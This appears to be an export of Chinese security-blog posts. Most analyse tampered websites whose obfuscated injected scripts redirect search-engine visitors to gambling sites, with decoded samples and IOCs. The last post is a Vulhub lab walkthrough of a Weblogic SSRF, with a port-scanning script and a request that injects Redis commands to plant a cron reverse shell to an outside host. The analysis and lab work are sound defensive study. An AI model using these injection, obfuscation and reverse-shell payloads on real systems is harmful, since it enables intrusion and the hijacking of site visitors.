100,111,99,117,109,101,110,116,46,119,114,105,116,101,108,110,40,34,60,115,99,114,105,112,116,32,115,114,99,61,92,39,104,116,116,112,58,47,47,98,97,105,100,117,46,99,111,109,92,39,62,60,47,115,99,114,105,112,116,62,34,41,59替换所有\",“为随机[a-zA-Z]，这里直接全部替换A了\n100A111A99A117A109A101A110A116A46A119A114A105A116A101A108A110A40A34A60A115A99A114A105A112A116A32A115A114A99A61A92A39A104A116A116A112A58A47A47A98A97A105A100A117A46A99A111A109A92A39A62A60A47A115A99A114A105A112A116A62A34A41A59再利用split拆分转字符数组\n\"100A111A99A117A109A101A110A116A46A119A114A105A116A101A108A110A40A34A60A115A99A114A105A112A116A32A115A114A99A61A92A39A104A116A116A112A58A47A47A98A97A105A100A117A46A99A111A109A92A39A62A60A47A115A99A114A105A112A116A62A34A41A59\".split(/[a-zA-Z]{1,}/)为了能够fromcharcode读取，传入参数需要调整，使用apply传入数组型参数，使用constructor对数组函数引用\n''.constructor.fromCharCode.apply(null,\"100A111A99A117A109A101A110A116A46A119A114A105A116A101A108A110A40A34A60A115A99A114A105A112A116A32A115A114A99A61A92A39A104A116A116A112A58A47A47A98A97A105A100A117A46A99A111A109A92A39A62A60A47A115A99A114A105A112A116A62A34A41A59\".split(/[a-zA-Z]{1,}/))通过混淆变形即生成jsonv4代码\n(((['xxx随机']+[])[\"constructor\"]['fromCharCode']['apply'](null,\"100A111A99A117A109A101A110A116A46A119A114A105A116A101A108A110A40A34A60A115A99A114A105A112A116A32A115A114A99A61A92A39A104A116A116A112A58A47A47A98A97A105A100A117A46A99A111A109A92A39A62A60A47A115A99A114A105A112A116A62A34A41A59\".split(/[a-zA-Z]{1,}/)))) ",
    "description": "",
    "tags": "红蓝对抗,页面篡改",
    "title": "页面篡改分析-基于sojson.v4混淆的页面篡思路分析",
    "uri": "/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-%E5%9F%BA%E4%BA%8Esojson.v4%E6%B7%B7%E6%B7%86%E7%9A%84%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90/index.html"
  },
  {
    "content": "BoCai网站分析\n样本基本情况 本次样本如下：\n\u003cscript language=\"javascript\" src=\"http://count5.51yes.com/click.aspx?id=51378275\u0026logo=1\" charset=\"gb2312\"\u003e\u003c/script\u003e \u003cscript src=http://www.616321.com/1.js \u003e\u003c/script\u003e ...... \u003cbody\u003e\u003cdiv class=\"z7z8z9z6\" style=\"position:fixed;left:-3000px;top:-3000px;\"\u003e \u003cli\u003e\u003ca href='http://www.kfqrlzy.com/20181223241252775444.html'\u003ehttp://www.kfqrlzy.com/20181223241252775444.html\u003c/a\u003e\u003c/li\u003e ...... \u003c/div class=\"z7z8z9z6\"\u003e ......概要分析 0x01http://count5.51yes.com/click.aspx?id=51378275\u0026logo=1\" 执行收集访问者信息并发送到http://count5.51yes.com/sa.htm统计的行为，该行为通常为收集信息行为，方便进行访问用户信息统计及身份识别。\nfunction y_gVal(iz){ var endstr=document.cookie.indexOf(\";\",iz); if(endstr==-1) endstr=document.cookie.length; return document.cookie.substring(iz,endstr); } function y_g(name){ var arg=name+\"=\"; var alen=arg.length; var clen=document.cookie.length; var i=0;var j; while(i\u003cclen) { j=i+alen; if(document.cookie.substring(i,j)==arg) return y_gVal(j); i=document.cookie.indexOf(\" \",i)+1; if(i==0) break; } return null; } function cc_k(){ var y_e=new Date(); var y_t=93312000;var yesvisitor=1000*36000; var yesctime=y_e.getTime(); y_e.setTime(y_e.getTime()+y_t); var yesiz=document.cookie.indexOf(\"cck_lasttime\"); if(yesiz==-1){ document.cookie=\"cck_lasttime=\"+yesctime+\"; expires=\" + y_e.toGMTString() + \"; path=/\"; document.cookie=\"cck_count=0; expires=\" + y_e.toGMTString() + \"; path=/\";return 0; } else{ var y_c1=y_g(\"cck_lasttime\"); var y_c2=y_g(\"cck_count\"); y_c1=parseInt(y_c1); y_c2=parseInt(y_c2); y_c3=yesctime-y_c1; if(y_c3\u003eyesvisitor){ y_c2=y_c2+1; document.cookie=\"cck_lasttime=\"+yesctime+\"; expires=\"+y_e.toGMTString()+\"; path=/\"; document.cookie=\"cck_count=\"+y_c2+\"; expires=\"+y_e.toGMTString()+\"; path=/\"; } return y_c2; } } var yesdata; yesdata='\u0026refe='+escape(document.referrer)+'\u0026location='+escape(document.location)+'\u0026color='+screen.colorDepth+'x\u0026resolution='+screen.width+'x'+screen.height+'\u0026returning='+cc_k()+'\u0026language='+navigator.systemLanguage+'\u0026ua='+escape(navigator.userAgent); document.write('\u003ca href=\"http://countt.51yes.com/index.aspx?id=51378275\" target=_blank\u003e\u003cimg width=20 height=20 border=0 hspace=0 vspace=0 src=\"http://count5.51yes.com/count1.gif\" alt=\"51YES网站统计系统\"\u003e\u003c/a\u003e'); document.write('\u003ciframe MARGINWIDTH=0 MARGINHEIGHT=0 HSPACE=0 VSPACE=0 FRAMEBORDER=0 SCROLLING=no src=http://count5.51yes.com/sa.htm?id=51378275'+yesdata+' height=0 width=0\u003e\u003c/iframe\u003e');根据源码，可知收集的信息有：Referer,User-Agent,Location,屏幕色彩,屏幕分辨率，系统语言等。最后讲这些信息拼凑成yesdata字段发送到count5.51yes.com做记录。\n0x02 http://www.616321.com/1.js(已无法访问) 0x03 http://www.kfqrlzy.com/20181223241252775444.html \u003cscript language=\"javascript\" src=\"http://count19.51yes.com/click.aspx?id=191757168\u0026logo=1\" charset=\"gb2312\"\u003e \u003cscript type=\"text/javascript\" src=\"http://www.616321.com/sd.js\"\u003e\u003c/script\u003e分析可知http://count19.51yes.com/click.aspx?id=191757168\u0026logo=1同上统计作用。 而http://www.616321.com/sd.js源码如下，并且我们可以推测上面1.js极有可能使用的是同样的代码。下面为sd.js的源码：\nvar sUserAgent= navigator.userAgent.toLowerCase(); var bIsIphoneOs= sUserAgent.match(/iphone/i) == \"iphone\"; var bIsSymb= sUserAgent.match(/symbianos/i) == \"symbianos\"; var bIsIpad= sUserAgent.match(/ipad/i) == \"ipad\"; var bIsIpod= sUserAgent.match(/ipod/i) == \"ipod\"; var bIsAndroid= sUserAgent.match(/android/i) == \"android\"; var bIsCE= sUserAgent.match(/windows ce/i) == \"windows ce\"; var bIsWM= sUserAgent.match(/windows mobile/i) == \"windows mobile\"; var bIsWP= sUserAgent.match(/windows phone/i) == \"windows phone\"; var isBDAPP=sUserAgent.match(/baiduboxapp/i) == \"baiduboxapp\"; var isBDBrowser=sUserAgent.match(/baidubrowser/i) == \"baidubrowser\"; var isM= bIsIphoneOs || bIsSymb || bIsIpad || bIsIpod || bIsAndroid || bIsCE || bIsWM || bIsWP; if (!isM || (!isBDAPP \u0026\u0026 !isBDBrowser)){ window.location.href=\"http://www.450378.com/?a=592088\";可知该脚本在执行的过程中进行UA判断，并通过判断指定来自百度的手机端和电脑端用户进行跳转并引导到BoCai网站http://www.450378.com/?a=592088。\n最终将导致百度UA进来的用户引导到BoCai网站。\nIOCs count5.51yes.com www.616321.com www.450378.com www.kfqrlzy.com\n",
    "description": "",
    "tags": "红蓝对抗,页面篡改",
    "title": "页面篡改分析一处BoCai页面",
    "uri": "/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90%E4%B8%80%E5%A4%84BoCai%E9%A1%B5%E9%9D%A2/index.html"
  },
  {
    "content": "Referer触发后端直接返回跳转 一般菠菜采用引用JS或者写入源码的JS静态加载固定加载的方式触发加载博彩页面，而近期发现了更为隐蔽的加载方式，仅通过referer检测判断来源，符合则直接返回跳转，不符合来源则不触发博彩页面。 引用外部脚本：http://aobo.jswpk.com/aobo.js 这里为了方便分析调整了下代码布局。\neval( function(p,a,c,k,e,d){ e=function(c){ return(c\u003ca?\"\":e(parseInt(c/a)))+((c=c%a)\u003e35?String.fromCharCode(c+29):c.toString(36)) }; if(!''.replace(/^/,String)){ while(c--)d[e(c)]=k[c]||e(c); k=\\[function(e){return d[e]}]; e=function(){return'\\\\w+'}; c=1; }; while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]); return p; } ('8{2.7.1.0=\"3://6.5.4/\"}a(9){}2.1.0=\"3://6.5.4/\";',11,11,'href|location|window|http|cn|ijk5|www|opener|try|e|catch'.split('|'),0,{}) )发现JS的eval(function(p,a,c,k,e,d) 加密，可以通过构造解密函数解密得到：（解密脚本见文末）\ntry{ window.opener.location.href=\"http://www.ijk5.cn/\" } catch(e){} window.location.href=\"http://www.ijk5.cn/\";可以看到外部加载的aobo.js可直接另用户访问页面之后直接跳转至http://www.ijk5.cn ，再看原文js插入的脚本\neval( function(p,a,c,k,e,r){ e=String; if('0'.replace(0,e)==0){ while(c--)r[e(c)]=k[c]; k=[function(e){return r[e]||e}]; e=function(){return'^$'};c=1 }; while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]); return p }('try{window.location.href=\"http://www.ijk5.cn/\"}catch(e){}',[],1,''.split('|'),0,{}) )解码可以得到,另一个插入的跳转js。\ntry{ window.location.href=\"http://www.ijk5.cn/\" } catch(e){}综上我们总结，该页面篡改的过程为，在页面中插入两处eval加密过的页面跳转，一处嵌入页面，一处通过引入外部js，最终在一些额外的判断结合下达到判断访问客户端，定向给某一类客户端用户做跳转页面的效果。这里攻击者既可以在js中加入对referer，UA等判断做定向，也可通过劫持baidu广告的流量做为中转定向到外部JS在做定向判断，达到隐蔽效果。在甄别过程中仍然需要根据复现情况仔细判断样本的情况。\n此次样本存在于网站的html页面中，通过嵌入eval加密及外部eval加密的js脚本加载跳转，通过判断触发规则：Referer: sogou.com或者其他搜索引擎如baidu.com、google.com等做定向客户端跳转。\n附录： eval(function(p,a,c,k,e,d))的解密脚本：（保存代码为demo.html,打开即可）\n\u003chtml\u003e \u003cbody\u003e \u003cscript\u003e a=62; function encode() { var code = document.getElementById('code').value; code = code.replace(/[\\r\\n]+/g, ''); code = code.replace(/'/g, \"\\\\'\"); var tmp = code.match(/\\b(\\w+)\\b/g); tmp.sort(); var dict = []; var i, t = ''; for(var i=0; i\u003ctmp.length; i++) { if(tmp[i] != t) dict.push(t = tmp[i]); } var len = dict.length; var ch; for(i=0; i\u003clen; i++) { ch = num(i); code = code.replace(new RegExp('\\\\b'+dict[i]+'\\\\b','g'), ch); if(ch == dict[i]) dict[i] = ''; } document.getElementById('new_code').value = \"eval(function(p,a,c,k,e,d){e=function(c){return(c\u003ca?'':e(parseInt(c/a)))+((c=c%a)\u003e35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\\\\\\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\\\\\\\b'+e(c)+'\\\\\\\\b','g'),k[c]);return p}(\" + \"'\"+code+\"',\"+a+\",\"+len+\",'\"+ dict.join('|')+\"'.split('|'),0,{}))\"; } function num(c) { return(c\u003ca?'':num(parseInt(c/a)))+((c=c%a)\u003e35?String.fromCharCode(c+29):c.toString(36)); } function run() { eval(document.getElementById('code').value); } function decode() { var code = document.getElementById('code').value; code = code.replace(/^eval/, ''); document.getElementById('new_code').value = eval(code); } \u003c/script\u003e \u003cdiv\u003eJS文件加密解密\u003c/div\u003e \u003cdiv\u003e原脚本\u003c/div\u003e \u003ctextarea id=\"code\" cols=80 rows=10\u003e \u003c/textarea\u003e \u003cdiv\u003e加密/解密后脚本\u003c/div\u003e \u003ctextarea id=\"new_code\" cols=80 rows=10\u003e \u003c/textarea\u003e \u003cdiv\u003e \u003cinput type=button onclick=encode() value=编码\u003e \u003cinput type=button onclick=run() value=执行\u003e \u003cinput type=button onclick=decode() value=解码\u003e \u003c/div\u003e \u003c/body\u003e \u003c/html\u003e参考文章 eval(function(p,a,c,k,e,r)解密程序 密码学笔记——eval(function(p,a,c,k,e,d) 的加密破解\n",
    "description": "",
    "tags": "红蓝对抗,页面篡改",
    "title": "页面篡改分析-JS的eval()加密方式跳转",
    "uri": "/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-JS%E7%9A%84eval%E5%8A%A0%E5%AF%86%E6%96%B9%E5%BC%8F%E8%B7%B3%E8%BD%AC/index.html"
  },
  {
    "content": "一处被篡改网站 本次样本概况页面篡改菠菜内容，同时加入eval加密js脚本，经过一次跳转及2次收集用户统计信息之后跳转到菠菜网站。 本次样本如下：\n\u003ctitle\u003e菠菜内容\u003c/title\u003e \u003cmeta name=\"keywords\" content=\"菠菜内容\" /\u003e \u003cmeta name=\"description\" content=\"菠菜内容\"/\u003e \u003cscript\u003e var _hmt = _hmt || []; (function() { var hm = document.createElement(\"script\"); hm.src = \"https://hm.baidu.com/hm.js?9a4c62a1985e8fbd8d0ce7c1a54070d1\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(hm, s); })(); \u003c/script\u003e \u003cscript type=\"text/javascript\"\u003e eval(function(p,a,c,k,e,d){e=function(c){return(c\u003ca?\"\":e(parseInt(c/a)))+((c=c%a)\u003e35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p;}('p[\"\\\\s\\\\u\\\\7\\\\m\\\\q\\\\6\\\\v\\\\0\"][\"\\\\j\\\\1\\\\a\\\\0\\\\6\"](\\'\\\\k\\\\2\\\\7\\\\1\\\\a\\\\5\\\\0\\\\9\\\\0\\\\t\\\\5\\\\6\\\\c\\\\4\\\\0\\\\6\\\\w\\\\0\\\\3\\\\e\\\\h\\\\r\\\\h\\\\2\\\\7\\\\1\\\\a\\\\5\\\\0\\\\4\\\\9\\\\1\\\\6\\\\d\\\\c\\\\4\\\\D\\\\b\\\\C\\\\b\\\\d\\\\d\\\\b\\\\j\\\\4\\\\9\\\\2\\\\1\\\\7\\\\c\\\\4\\\\F\\\\0\\\\0\\\\5\\\\n\\\\3\\\\3\\\\E\\\\f\\\\g\\\\8\\\\g\\\\f\\\\8\\\\B\\\\8\\\\l\\\\y\\\\n\\\\x\\\\o\\\\o\\\\l\\\\3\\\\e\\\\2\\\\3\\\\A\\\\z\\\\m\\\\1\\\\8\\\\e\\\\2\\\\4\\\\9\\\\i\\\\k\\\\3\\\\2\\\\7\\\\1\\\\a\\\\5\\\\0\\\\i\\');',42,42,'x74|x72|x73|x2F|x22|x70|x65|x63|x2E|x20|x69|x6F|x3D|x6C|x6A|x30|x33|x61|x3E|x77|x3C|x39|x75|x3A|x38|window|x6d|x76|x64|x79|x6f|x6e|x78|x37|x36|x43|x53|x34|x66|x6E|x31|x68'.split('|'),0,{})) \u003c/script\u003e ......页面篡改分析 发现其中的篡改信息，以及两处js脚本插入。其中菠菜信息UTF-8的反转译可得：\n两个脚本一个是百度统计https://hm.baidu.com/hm.js?9a4c62a1985e8fbd8d0ce7c1a54070d1， 另一个是eval加密如下：\neval(function(p,a,c,k,e,d){e=function(c){return(c\u003ca?\"\":e(parseInt(c/a)))+((c=c%a)\u003e35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p;}('p[\"\\\\s\\\\u\\\\7\\\\m\\\\q\\\\6\\\\v\\\\0\"][\"\\\\j\\\\1\\\\a\\\\0\\\\6\"](\\'\\\\k\\\\2\\\\7\\\\1\\\\a\\\\5\\\\0\\\\9\\\\0\\\\t\\\\5\\\\6\\\\c\\\\4\\\\0\\\\6\\\\w\\\\0\\\\3\\\\e\\\\h\\\\r\\\\h\\\\2\\\\7\\\\1\\\\a\\\\5\\\\0\\\\4\\\\9\\\\1\\\\6\\\\d\\\\c\\\\4\\\\D\\\\b\\\\C\\\\b\\\\d\\\\d\\\\b\\\\j\\\\4\\\\9\\\\2\\\\1\\\\7\\\\c\\\\4\\\\F\\\\0\\\\0\\\\5\\\\n\\\\3\\\\3\\\\E\\\\f\\\\g\\\\8\\\\g\\\\f\\\\8\\\\B\\\\8\\\\l\\\\y\\\\n\\\\x\\\\o\\\\o\\\\l\\\\3\\\\e\\\\2\\\\3\\\\A\\\\z\\\\m\\\\1\\\\8\\\\e\\\\2\\\\4\\\\9\\\\i\\\\k\\\\3\\\\2\\\\7\\\\1\\\\a\\\\5\\\\0\\\\i\\');',42,42,'x74|x72|x73|x2F|x22|x70|x65|x63|x2E|x20|x69|x6F|x3D|x6C|x6A|x30|x33|x61|x3E|x77|x3C|x39|x75|x3A|x38|window|x6d|x76|x64|x79|x6f|x6e|x78|x37|x36|x43|x53|x34|x66|x6E|x31|x68'.split('|'),0,{}))经过解密：\nwindow[\"document\"][\"write\"]('\u003cscript type=\"text/javascript\" rel=\"nofollow\" src=\"http://103.30.4[.]96:7889/js/SCur.js\" \u003e\u003c/script\u003e');追溯103.30.4[.]96:7889/js/SCur.js源码如下：\nvar _hmt = _hmt || []; (function() { var hm = document.createElement(\"script\"); hm.src = \"https://hm.baidu.com/hm.js?9a4c62a1985e8fbd8d0ce7c1a54070d1\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(hm, s); })(); document.writeln(\"\u003cscript LANGUAGE=\\\"Javascript\\\"\u003e\"); document.writeln(\"var s=document.referrer\"); document.writeln(\"if(s.indexOf(\\\"baidu\\\")\u003e0 || s.indexOf(\\\"sogou\\\")\u003e0 || s.indexOf(\\\"soso\\\")\u003e0 ||s.indexOf(\\\"sm\\\")\u003e0 ||s.indexOf(\\\"uc\\\")\u003e0 ||s.indexOf(\\\"bing\\\")\u003e0 ||s.indexOf(\\\"yahoo\\\")\u003e0 ||s.indexOf(\\\"so\\\")\u003e0 )\"); document.writeln(\"location.href=\\\"http://103.37.233.13:888/bcs.html\\\";\"); document.writeln(\"\u003c/script\u003e\");分析可知该脚本加载之后，将在源业务页面插入一个百度统计以及一个跳转http://103.37.233.13:888/bcs.html跳转条件是当访问业务页面的referer中还有baidu/sogou/soso/sm/uc/bing/yahoo/so的字符。\n跳转过程分析 对该网页源码进行分析：\n\u003cscript language=\"javascript\"\u003e setTimeout(function(){ var arr=[\"http://www[.]59759l[.]vip/\",\"http://www[.]59759l[.]vip/\"]; window.location.href=arr[parseInt(Math.random()*arr.length)]; },0); \u003c/script\u003e ......同时在跳转页面发现了51yes的统计代码： http://count50.51yes.com/click.aspx?id=503589630\u0026logo=1源码如下：\nfunction y_gVal(iz) {var endstr=document.cookie.indexOf(\";\",iz);if(endstr==-1) endstr=document.cookie.length;return document.cookie.substring(iz,endstr);} function y_g(name) {var arg=name+\"=\";var alen=arg.length;var clen=document.cookie.length;var i=0;var j;while(i\u003cclen) {j=i+alen;if(document.cookie.substring(i,j)==arg) return y_gVal(j);i=document.cookie.indexOf(\" \",i)+1;if(i==0) break;}return null;} function cc_k() {var y_e=new Date();var y_t=93312000;var yesvisitor=1000*36000;var yesctime=y_e.getTime();y_e.setTime(y_e.getTime()+y_t);var yesiz=document.cookie.indexOf(\"cck_lasttime\");if(yesiz==-1){document.cookie=\"cck_lasttime=\"+yesctime+\"; expires=\" + y_e.toGMTString() + \"; path=/\";document.cookie=\"cck_count=0; expires=\" + y_e.toGMTString() + \"; path=/\";return 0;}else{var y_c1=y_g(\"cck_lasttime\");var y_c2=y_g(\"cck_count\");y_c1=parseInt(y_c1);y_c2=parseInt(y_c2);y_c3=yesctime-y_c1;if(y_c3\u003eyesvisitor){y_c2=y_c2+1;document.cookie=\"cck_lasttime=\"+yesctime+\"; expires=\"+y_e.toGMTString()+\"; path=/\";document.cookie=\"cck_count=\"+y_c2+\"; expires=\"+y_e.toGMTString()+\"; path=/\";}return y_c2;}} var yesdata; yesdata='\u0026refe='+escape(document.referrer)+'\u0026location='+escape(document.location)+'\u0026color='+screen.colorDepth+'x\u0026resolution='+screen.width+'x'+screen.height+'\u0026returning='+cc_k()+'\u0026language='+navigator.systemLanguage+'\u0026ua='+escape(navigator.userAgent); document.write('\u003ca href=\"http://countt.51yes.com/index.aspx?id=503589630\" target=_blank\u003e\u003cimg width=20 height=20 border=0 hspace=0 vspace=0 src=\"http://count50.51yes.com/count1.gif\" alt=\"51YES网站统计系统\"\u003e\u003c/a\u003e');document.write('\u003ciframe MARGINWIDTH=0 MARGINHEIGHT=0 HSPACE=0 VSPACE=0 FRAMEBORDER=0 SCROLLING=no src=http://count50.51yes.com/sa.htm?id=503589630'+yesdata+' height=0 width=0\u003e\u003c/iframe\u003e');对页面访问者信息进行收集，同上一篇文中提到的一样。统计并页面进行跳转直接引流到博彩页面 IOCs https://hm.baidu.com/hm.js?9a4c62a1985e8fbd8d0ce7c1a54070d1 http://103.30.4[.]96:7889/js/SCur.js http://103.37.233[.]13:888/bcs.html http://www.59759l[.]vip http://countt.51yes[.]com/index.aspx?id=503589630\n",
    "description": "",
    "tags": "红蓝对抗,页面篡改",
    "title": "页面篡改分析-EVAL加密",
    "uri": "/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-EVAL%E5%8A%A0%E5%AF%86/index.html"
  },
  {
    "content": "某站页面篡改事件取证分析 一处BoCai内容重定向篡改事件的分析及回溯过程。\n0x01 篡改内容调查取证 本次样本来源于工作，该样本使用已经被篡改的模板页面，敏感篡改点（或BoCai触发点）有2处，如图所示 文本篡改如前文图片所示。 主要篡改点如下： 0x02 篡改代码分析 对其编码转码：(转码可直接到sojson.com的 js解码)\n\u003cscript LANGUAGE=\"Javascript\"\u003e var OmBIhYNl1=window[\"document\"][\"referrer\"] if(OmBIhYNl1[\"indexOf\"](\"google\")\u003e0 || OmBIhYNl1[\"indexOf\"](\"baidu\")\u003e0 || OmBIhYNl1[\"indexOf\"](\"sogou\")\u003e0 ) location[\"href\"]=\"http://www.a5qqq[.]com\"; \u003c/script\u003e可以看出该页面除了页面篡改还存在针对来自google、sogou、baidu的请求重定向脚本，脚本重定向到http[://www].a5qqq.com （198.16.46.26）\n此外页面还存在有可能有助于定位的，页面统计代码： http://js.passport.qihucdn.com/11.0.1.js?0cafbe109ab248eb7be06d7f99c4009f 奇虎75cdn统计\nIOCs www[.]a5qqq[.]com vip.haxhr.com\n",
    "description": "",
    "tags": "红蓝对抗,页面篡改",
    "title": "页面篡改分析-基于sojson.v4混淆的页面篡思路分析",
    "uri": "/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-%E9%87%8D%E5%AE%9A%E5%90%91%E7%AF%A1%E6%94%B9%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E5%8F%8A%E5%9B%9E%E6%BA%AF%E8%BF%87%E7%A8%8B/index.html"
  },
  {
    "content": " Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。\nWeblogic SSRF漏洞 @Vulhub\n启动环境 cd .../Vulhub/vulhub/weblogic/ssrfdocker-compose build docker-compose up -d dockerps访问http://your-ip:7001/uddiexplorer/，无需登录即可查看uddiexplorer应用。\nSSRF漏洞测试 SSRF漏洞存在于http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp，我们在brupsuite下测试该漏洞。访问一个可以访问的IP:PORT，如http://127.0.0.1:80：\nGET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name\u0026txtSearchname=sdf\u0026txtSearchkey=\u0026txtSearchfor=\u0026selfor=Business+location\u0026btnSubmit=Search\u0026operator=http://127.0.0.1:7001 HTTP/1.1 Host: localhost Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close可访问的端口将会得到错误，一般是返回status code（如下图），如果访问的非http协议，则会返回did not have a valid SOAP content-type。 修改为一个不存在的端口，将会返回could not connect over HTTP to server。 A: 10.0.0.0~10.255.255.255即10.0.0.0/8\nB:172.16.0.0~172.31.255.255即172.16.0.0/12\nC:192.168.0.0~192.168.255.255 即192.168.0.0/16\\\n注入HTTP头，利用Redis反弹shell Weblogic的SSRF有一个比较大的特点，其虽然是一个“GET”请求，但是我们可以通过传入%0a%0d来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。\n首先，通过ssrf探测内网中的redis服务器（docker环境的网段一般是172.*），发现172.18.0.2:6389可以连通：\nweblogic_ssrf.py\n#!/usr/bin/env python # coding: utf-8 #'Weblogic SSRF 扫描内网 IP 开放端口 ' import argparse import thread import time import re import requests def ite_ip(ip): for i in range(1, 256): final_ip = '{ip}.{i}'.format(ip=ip, i=i) print final_ip thread.start_new_thread(scan, (final_ip,)) time.sleep(3) def scan(final_ip): ports = ('21', '22', '23', '53', '80', '135', '139', '443', '445', '1080', '1433', '1521', '3306', '3389', '4899', '8080', '7001', '8000','6389','6379') for port in ports: vul_url = args.url+'/uddiexplorer/SearchPublicRegistries.jsp?operator=http://%s:%s\u0026rdoSearch=name\u0026txtSearchname=sdf\u0026txtSearchkey=\u0026txtSearchfor=\u0026selfor=Business+location\u0026btnSubmit=Search' % (final_ip,port) try: #print vul_url r = requests.get(vul_url, timeout=15, verify=False) result1 = re.findall('weblogic.uddi.client.structures.exception.XML_SoapException',r.content) result2 = re.findall('but could not connect', r.content) result3 = re.findall('No route to host', r.content) #bugfix:此处进行优化，防止抛出no route to host类型错误 if len(result1) != 0 and len(result2) == 0 and len(result3) == 0: print '[!]'+final_ip + ':' + port except Exception, e: pass if __name__ == '__main__': parser = argparse.ArgumentParser(description='Weblogic SSRF vulnerable exploit') parser.add_argument('--url', dest='url', required=True, help='Target url') # parser.add_argument('--ip', dest='scan_ip', help='IP to scan') args = parser.parse_args() # ip = '.'.join(args.scan_ip.split('.')[:-1]) ip = \"172.19.0\" #这里diy了一下，用来探测172.19.0网段中各组件的开放的端口，试图找出redis位置。ps:我也探测过172.18.0网段，但其中并没有开启6379的。 if ip: print ip ite_ip(ip) else: print \"no ip\"python weblogic_ssrf.py --url http://192.168.199.128:7001 docker ps发送三条redis命令，将弹shell脚本写入/etc/crontab：\ntest%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.18.0.1%2F21%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa明文：\ntest set 1 \"\\n\\n\\n\\n* * * * * root bash -i \u003e\u0026 /dev/tcp/172.18.0.1/21 0\u003e\u00261\\n\\n\\n\\n\" config set dir /etc/ config set dbfilename crontab save aaa可进行利用的cron有如下几个地方：\n/etc/crontab 这个是肯定的\n/etc/cron.d/* 将任意文件写到该目录下，效果和crontab相同，格式也要和/etc/crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。\n/var/spool/cron/root centos系统下root用户的cron文件\n/var/spool/cron/crontabs/root debian系统下root用户的cron文件\\\nGET /uddiexplorer/SearchPublicRegistries.jsp?operator=http://172.19.0.2:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn%2A%20%2A%20%2A%20%2A%20%2A%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.0.3%2F1337%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa\u0026rdoSearch=name\u0026txtSearchname=\u0026txtSearchkey=\u0026txtSearchfor=\u0026selfor=Business+location\u0026btnSubmit=Search HTTP/1.1 Host: 192.168.199.128:7001 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN Accept-Encoding: gzip, deflate Referer: http://192.168.199.128:7001/uddiexplorer/SearchPublicRegistries.jsp Cookie: publicinquiryurls=http://www-3.ibm.com/services/uddi/inquiryapi!IBM|http://www-3.ibm.com/services/uddi/v2beta/inquiryapi!IBM V2|http://uddi.rte.microsoft.com/inquire!Microsoft|http://services.xmethods.net/glue/inquire/uddi!XMethods|; JSESSIONID=Jk6NhwsLDrRGGlV6KvwsVQv2cV2qtSD93zXJvgsbw4B8Rt05Js2j!971195201 DNT: 1 Connection: close 